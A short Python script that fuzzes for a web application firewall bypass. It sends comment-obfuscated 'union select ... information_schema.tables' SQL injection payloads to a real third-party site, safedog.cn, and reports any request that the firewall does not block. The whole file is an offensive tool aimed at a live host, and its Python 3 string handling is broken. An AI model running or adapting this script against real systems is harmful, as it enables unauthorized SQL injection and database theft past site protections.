#! -*- encoding:utf-8 -*-
# python3

import requests

fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
fuzz_sz = ['',' ']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]

fuzz = fuzz_zs+fuzz_sz+fuzz_ch
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"}
url_start = "http://www.safedog.cn/service.html?serIdx=2/********ssssssss**********/union/********ssssssss**********/select/********ssssssss**********/1,2/********ssssssss**********/from/********ssssssss**********/"

for a in fuzz:
    for b in fuzz:
        for c in fuzz:
            for d in fuzz:
                    exp = "/*!"+a+b+c+d+"information_schema.tables*/"
                    url = url_start + exp
                    # print url
                    res = requests.get(url = url , headers = headers)
                    # print("Now URL:"+url)
                    if (("网站防火墙").decode('utf-8') in res.text) == False:
                        print("Find Fuzz bypass:"+url)
                        # with open("IIS_results.txt",'a',encoding='utf-8') as r:
                            # r.write(url+"\n")
